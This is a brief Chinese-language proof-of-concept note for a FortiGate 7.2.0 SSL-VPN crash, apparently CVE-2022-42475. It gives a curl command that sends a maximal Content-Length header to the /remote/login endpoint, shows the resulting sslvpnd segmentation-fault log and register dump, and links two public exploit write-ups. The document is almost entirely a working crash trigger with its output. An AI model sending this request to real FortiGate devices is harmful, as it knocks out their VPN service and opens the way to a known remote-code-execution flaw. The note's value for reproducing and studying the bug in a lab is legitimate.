# 环境

FGT: 7.2.0

CPU: 4

# poc

```
diagnose debug crashlog read
```

```
curl -v --insecure -H "Content-Length: 2147483647" --data 1 https://192.168.182.188:8443/remote/login
```

崩溃输出：

```
2303: 2024-12-01 22:56:53 <00223> firmware FortiGate-VM64-KVM v7.2.0,build1157b1157,220331 (GA.F) 
2304: 2024-12-01 22:56:53 (Release)
2305: 2024-12-01 22:56:53 <00223> application sslvpnd
2306: 2024-12-01 22:56:53 <00223> *** signal 11 (Segmentation fault) received ***
2307: 2024-12-01 22:56:53 <00223> Register dump:
2308: 2024-12-01 22:56:53 <00223> RAX: 00007f337d36a7c8   RBX: ffffffff80000000
2309: 2024-12-01 22:56:53 <00223> RCX: 00007f337d36a800   RDX: ffffffff80000000
2310: 2024-12-01 22:56:53 <00223> R08: 00007f337d36a7c8   R09: 0000000000000000
2311: 2024-12-01 22:56:53 <00223> R10: 0000000000000000   R11: 0000000000000246
2312: 2024-12-01 22:56:53 <00223> R12: ffffffff80000000   R13: 00007f337d369400
2313: 2024-12-01 22:56:53 <00223> R14: 00007f337d3e6b08   R15: 0000000000000000
2314: 2024-12-01 22:56:53 <00223> RSI: 0000000000000000   RDI: 00007f337d36a7c8
2315: 2024-12-01 22:56:53 <00223> RBP: 00007fff29416940   RSP: 00007fff29416918
2316: 2024-12-01 22:56:53 <00223> RIP: 00007f3383327b30   EFLAGS: 0000000000010206
2317: 2024-12-01 22:56:53 <00223> CS:  0033   FS: 0000   GS: 0000
2318: 2024-12-01 22:56:53 <00223> Trap: 000000000000000e   Error: 0000000000000006
2319: 2024-12-01 22:56:53 <00223> OldMask: 0000000000000000
2320: 2024-12-01 22:56:53 <00223> CR2: 00007f32fd36a7b8
2321: 2024-12-01 22:56:53 <00223> stack: 0x7fff29416918 - 0x7fff29419890 
2322: 2024-12-01 22:56:53 <00223> Backtrace:
2323: 2024-12-01 22:56:53 <00223> [0x7f3383327b30] => /usr/lib/x86_64-linux-gnu/libc.so.6  liboffset 
2324: 2024-12-01 22:56:53 000a4b30
2325: 2024-12-01 22:56:53 <00223> [0x015f14eb] => /bin/sslvpnd  
2326: 2024-12-01 22:56:53 <00223> [0x0171a602] => /bin/sslvpnd  
2327: 2024-12-01 22:56:53 <00223> [0x01713ad5] => /bin/sslvpnd  
2328: 2024-12-01 22:56:53 <00223> [0x017152a0] => /bin/sslvpnd  
2329: 2024-12-01 22:56:53 <00223> [0x0171537e] => /bin/sslvpnd  
2330: 2024-12-01 22:56:53 <00223> [0x01715b91] => /bin/sslvpnd  
2331: 2024-12-01 22:56:53 <00223> [0x01716f42] => /bin/sslvpnd  
2332: 2024-12-01 22:56:53 <00223> [0x01717236] => /bin/sslvpnd  
2333: 2024-12-01 22:56:53 <00223> [0x01717919] => /bin/sslvpnd  
2334: 2024-12-01 22:56:53 <00223> [0x0044c88f] => /bin/sslvpnd  
2335: 2024-12-01 22:56:53 <00223> [0x004554ca] => /bin/sslvpnd  
2336: 2024-12-01 22:56:53 <00223> [0x0045212c] => /bin/sslvpnd  
2337: 2024-12-01 22:56:53 <00223> [0x00454738] => /bin/sslvpnd  
2338: 2024-12-01 22:56:53 <00223> [0x00455061] => /bin/sslvpnd  
2339: 2024-12-01 22:56:53 <00223> [0x7f33832a6deb] => /usr/lib/x86_64-linux-gnu/libc.so.6 
2340: 2024-12-01 22:56:53 (__libc_start_main+0x000000eb) liboffset 00023deb
2341: 2024-12-01 22:56:53 <00223> [0x00447daa] => /bin/sslvpnd  
2342: 2024-12-01 22:56:53 <00223> fortidev 6.0.1.0005
Crash log interval is 3600 seconds
sslvpnd crashed 1 times. The last crash was at 2024-12-01 22:56:53
Max crash log line number: 16384
```

# 资料

A More Complete Exploit for Fortinet CVE-2022-42475

https://bishopfox.com/blog/exploit-cve-2022-42475

We're Out Of Titles For VPN Vulns - It's Not Funny Anymore (Fortinet CVE-2022-42475)

https://labs.watchtowr.com/fortinet-no-more-funny-titles-cve-2022-42475/